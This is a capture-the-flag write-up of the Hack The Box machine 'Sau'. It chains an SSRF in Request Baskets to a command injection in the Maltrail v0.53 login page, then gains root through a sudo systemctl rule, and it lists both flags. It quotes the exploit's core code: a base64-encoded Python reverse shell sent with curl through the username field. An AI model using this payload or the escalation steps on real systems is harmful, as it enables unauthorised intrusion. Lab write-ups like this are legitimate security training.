---
type: box
finished: "true"
writeup: "true"
---

# Notes:

### IP:
10.10.11.224
### Level:
Easy
### User flag:
aae76269af82f34d13677a7c61db2a48
### Root flag:
c5b4ba7e6f9f1d81ec295f0c28e08ac8


# Nmap

### Nmap gives the following output
```
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA)
|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)
|_  256 b30c47fba2f212ccce0b58820e504336 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Mon, 06 Nov 2023 16:33:37 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Mon, 06 Nov 2023 16:33:11 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Mon, 06 Nov 2023 16:33:11 GMT
|_    Content-Length: 0

```
### With this command
```
nmap -p- -sV -sC 10.10.11.224
```

# Web

Accessing both the 80 port and 8338 port gives us no response on Firefox.
<b>However</b> the :55555 port gives us something:
![[writeups/HTB/BOX/SAU/pictures/website.png]]

A request basket webpage. Googling a bit around allows us to find that version 1.2.1 and under is vulnerable to a SSFR attack. Checking the version on the webpage to see if we have that version and...

![[baskets-version.png]]
### <b>bingo</b>

# SSRF with **[CVE-2023-27163](https://github.com/entr0pie/CVE-2023-27163)**:

Cloning the repository and using the script, we can make the server redirect itself to the other ports we found earlier in the nmap scan, specifically port 80 and port 8338.

We can run these commands that gives us the URL's that redirects to itself with their ports.
```
./CVE-2023-27163.sh http://10.10.11.224:55555 http://127.0.0.1:8338
```
and
```
./CVE-2023-27163.sh http://10.10.11.224:55555 http://127.0.0.1:80
```

Going to the new basket we have created redirects us to those ports where this strange website is hosted:
![[Maltrail-website.png]]

This really gives us nothing. We see that there is a log in button, however it's not clickable. Nor does it have a link that redirects in the html. HOWEVER! On the bottom of the page we see something interesting once more:

![[Maltrail-version.png]]

Googling "Maltrail (v0.53)" led me to this https://github.com/spookier/Maltrail-v0.53-Exploit GitHub page. So as the github page describes. There is a RCE (Remote Code Execution) vulunrability in the login page for Maltrail version 0.53. This must be the "Log In" button we saw previously. So by pure chance I wanted to see if there is a directory called login and...

![[Maltrail-login.png]]

### Bingo (again)

So we know there is a login page. We can either use the this nice person's repo, or you can manually send a request via curl, where the data is a reverse shell that's 64 encoded, and decoded using bash on the server's side. OR you can download the script and run it.

If you're curious what the script does:

```python
payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''

encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64

command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
```

This is the main part of the script. The **payload** is a reverse shell that uses python to spawn a shell. The **encoded payload** is just the base64 encoded version of that very payload. Finally the **command** is the request that RCE's the username field with a simple semicolon and then decrypts our payload on the server and runs it.

Pulling all of this together or running the script and...

![[we're-in.png]]
## **We're in**

Navigating to /home/puma we can now cat out the file user.txt and get:
![[user.txt.png]]

# Privilege escalation with # Systemctl:

This one was kind of a cakewalk.

Doing the command `sudo -l` is a quick way to find any privilage escalations, because it lists every command our user can run as root using the sudo command. We then get the output:

```
$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

We can run the the command `sudo systemctl status trail.service` with no password what so ever. This article goes more in depth on what you can do to privilege escalate with Systemctl: https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/

We can just run `sudo systemctl status trail.service` and spawn a shell with `!sh` and boom! We are now root. All we have to do now is cat out the contents of /root/root.txt and:

```
# cat /root/root.txt
c5b4ba7e6f9f1d81ec295f0c28e08ac8
```

**In conclusion**: The user flag was very hard to get conceptually and the one I was stuck on. I knew that there was a SSFR, however I didn't know what to do with it. After knowing you could redirect into it's own ports, the challenge became a lot more feasible. I didn't write any of my own scripts with this challenge so hopefully there will come a time in the future for that.